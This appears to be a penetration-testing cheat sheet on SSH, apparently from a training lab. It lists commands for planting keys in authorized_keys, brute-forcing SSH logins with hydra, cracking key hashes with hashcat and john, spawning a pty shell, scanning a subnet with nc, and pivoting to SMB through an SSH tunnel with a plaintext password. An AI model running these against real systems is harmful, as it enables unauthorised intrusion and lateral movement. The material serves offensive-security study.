## SSH
 Overwrite Keys																			
 ssh-keygen
 cat <key file>.pub > authorized_keys
 upload authorized_keys to webserver's ssh directory
  ssh -p 2222 <key file> root@webserver.com 
 
 
 Brute Force																						
 
 sudo hydra -l george -P /usr/share/wordlists/rockyou.txt -s 2222 ssh://192.168.50.201
 hashcat -m 22921 ssh.hash ssh.passwords -r ssh.rule --force
 john --wordlist=ssh.passwords --rules=sshRules ssh.hash
 
 

 Troubleshooting																	
 rm ~/.ssh/known_hosts
 
 ssh -o "UserKnownHostsFile=/dev/null" -o "StrictHostKeyChecking=no"
learner@192.168.50.52

SSH Tunnel																			

Make it a party:
target > python3 -c 'import pty; pty.spawn("/bin/bash")'

Connect and enumerate:
target > ssh database_admin@10.4.50.215
deep target > ip addr
deep target> ip route
deep target > for i in $(seq 1 254); do nc -zv -w 1 172.16.50.$i 445; done
Kill the ssh connection and then open a new one.
target > ssh -N -L 0.0.0.0:4455:172.16.50.217:445 database_admin@10.4.50.215 -v
target > ss -ntplu
Then we can interact with the open port on the target:
kali > smbclient -p 4455 -L //192.168.50.63/ -U hr_admin --password=Welcome1234

If you have root on the client, use sshuttle.


Copy File		                                    							

scp user@remote_host:/path/to/file /path/on/local/machine

